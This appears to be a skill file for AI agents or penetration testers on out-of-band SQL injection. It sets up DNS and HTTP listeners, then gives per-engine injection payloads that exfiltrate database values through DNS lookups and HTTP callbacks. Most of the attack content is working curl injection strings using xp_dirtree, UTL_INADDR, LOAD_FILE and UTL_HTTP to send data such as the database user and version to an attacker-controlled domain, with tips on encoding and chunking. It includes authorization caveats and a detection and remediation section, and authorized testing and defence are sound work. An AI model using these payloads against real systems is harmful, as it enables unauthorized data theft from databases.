---
name: sqli-out-of-band
description: Use when blind SQL injection is confirmed but boolean and time
  extraction are too slow or blocked, and you need data exfiltrated through
  DNS or HTTP callbacks during an authorized test. Covers DNS exfiltration
  with UNC paths and load_file, HTTP callbacks, setting up a collaborator
  listener, and encoding data for the channel. Use when the database server
  can reach the internet, when in-band and blind channels are filtered, or
  when you need whole values per request instead of bit-by-bit extraction.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-sqli
requires: [web-sqli]
extends: []
relates: [network-pivoting]
tools:
  - name: Python
    version: 3.12
  - name: Burp Suite
    version: 2026.2
  - name: curl
    version: 8.5
---

Out-of-band (OOB) SQL injection makes the database server itself send the
answer to you, usually through a DNS lookup or an HTTP request that carries
the stolen data in the hostname or URL. This skill covers OOB extraction for
authorized tests: the DNS exfiltration primitives per engine, HTTP callback
techniques, running your own listener, and encoding data so it survives the
channel. Use it when blind extraction is confirmed too slow, and only when
the rules of engagement allow the database to make outbound connections.

## Quick Workflow

1. Confirm the database host can resolve external names (test with a benign
   lookup to your listener first).
2. Start your DNS or HTTP listener and verify you see the test callback.
3. Pick the OOB primitive for the fingerprinted engine (UNC path, load_file,
   UTL_HTTP, xp_dirtree).
4. Exfiltrate short values first (version, user) to validate the channel.
5. Encode longer values (hex) and split them across multiple lookups to fit
   DNS label limits.
6. Extract only the minimum data needed, then shut the listener down.
7. Record every callback with timestamps for the report.

## 1. Listener setup

You need a server you control that logs incoming DNS queries or HTTP hits.

```bash
# Simple HTTP listener with Python stdlib (logs every hit)
python3 -m http.server 8080 --bind 0.0.0.0 2>&1 | tee /tmp/oob_hits.log

# DNS listener: use Burp Collaborator, or run a tiny UDP logger
python3 - <<'EOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", 5353))
print("[*] DNS listener on :5353")
while True:
    data, addr = s.recvfrom(512)
    print(addr, data[:80])
EOF
```

Burp Collaborator is the practical default: it gives you a unique domain and
a polling interface, with no firewall work. Confirm the listener sees a
manual `nslookup test.your-collaborator-domain` from your own machine before
involving the target.

## 2. DNS exfiltration per engine

DNS labels hold 63 characters, so hex-encode data and split it.

```bash
# Microsoft SQL Server: xp_dirtree triggers a DNS lookup with data in the path
# Hex of version string, chunked
curl -s "https://target.example/item?id=5%3BDECLARE%20@h%20varchar(1024)%3BSET%20@h%3D(SELECT%20master.dbo.fn_varbintohexstr(CAST(@@version%20AS%20varbinary)))%3BEXEC('master..xp_dirtree%20''\\\\'%2B@h%2B'.YOURDOMAIN''')--%20-" -o /dev/null

# Oracle: UTL_INADDR or DBMS_LDAP force resolution
curl -s "https://target.example/item?id=5%20AND%201%3DUTL_INADDR.GET_HOST_ADDRESS((SELECT%20user%20FROM%20dual)%7C%7C'.YOURDOMAIN')--%20-" -o /dev/null

# MySQL: LOAD_FILE with a UNC path (Windows hosts only)
curl -s "https://target.example/item?id=5'%20AND%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20user()),'.YOURDOMAIN\\\\x'))--%20-" -o /dev/null

# PostgreSQL: COPY to a UNC path also resolves (Windows hosts)
# or use dblink if the extension is installed
```

Watch the listener: each lookup arrives as
`<hexchunk>.YOURDOMAIN`, which you decode back to text.

```bash
# Decode captured hex chunks
python3 -c "print(bytes.fromhex('76312e302e31').decode())"
```

## 3. HTTP callback exfiltration

When DNS is blocked but HTTP egress is open, make the database fetch a URL
containing the data.

```bash
# Oracle UTL_HTTP: data goes in the URL path
curl -s "https://target.example/item?id=5%20AND%201%3DUTL_HTTP.REQUEST('http://YOURSERVER:8080/'%7C%7C(SELECT%20user%20FROM%20dual))--%20-" -o /dev/null

# MSSQL: xp_cmdshell with curl only if the rules of engagement allow
# command execution, which is a bigger step than data theft. Prefer DNS.

# MySQL: no native HTTP primitive; chain through LOAD_FILE to an
# HTTP-served SMB share is unreliable, so prefer DNS or fall back to blind.
```

Keep the listener log as evidence. Each hit line with its timestamp proves
the exfiltration channel worked and shows exactly what was received.

## Edge cases

- The database server has no internet egress. OOB is impossible; confirm
  with a benign lookup test first and fall back to blind extraction instead
  of wasting the test window.
- DNS labels truncate at 63 characters. Chunk hex data into 60-character
  pieces and reassemble, or exfiltrate one column value per lookup.
- Special characters break the hostname. Hex-encode everything before
  embedding it in the lookup name.
- The collaborator domain is blocked by the target's DNS filter. Use a
  fresh subdomain per test and keep the exfiltrated volume small.
- Oracle 11g+ restricts UTL packages by default. If the call fails with an
  access error, the DBA hardened it; do not try to escalate around it
  without explicit permission.

## Escalation

- DNS callbacks never arrive: verify egress with the benign test, check the
  listener is reachable from the internet (not just your LAN), and confirm
  no firewall rule on your side drops inbound UDP.
- Only some chunks arrive: the channel is lossy, so number your chunks
  (`1.<hex>.YOURDOMAIN`) and re-request the missing ones.
- The WAF blocks the OOB keywords (`xp_dirtree`, `UTL_HTTP`): try
  stacked-query framing or accept that blind extraction is the approved
  path for this target.
- You need full table data: OOB is a per-value channel, so extract keys
  first, then decide with the test lead whether the volume is justified.

## Detection and defender view

Defenders see OOB exfiltration as DNS queries or HTTP requests from a
database server to external domains, which is highly anomalous: database
hosts should never browse the internet. DNS logs showing long hex
subdomains, firewall logs showing database-to-internet connections, and
database audit logs of `xp_dirtree` or `UTL_HTTP` calls are the key signals.
The durable fix is egress filtering (databases get no internet route),
disabling dangerous extended procedures and packages, and alerting on any
outbound connection from a database tier.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- MITRE ATT&CK T1048 (Exfiltration Over Alternative Protocol).
- CWE-89 (Improper Neutralization of Special Elements used in an SQL
  Command, SQL Injection).
- OWASP Testing Guide: Testing for SQL Injection.
- PortSwigger Web Security Academy: Out-of-band SQL injection.
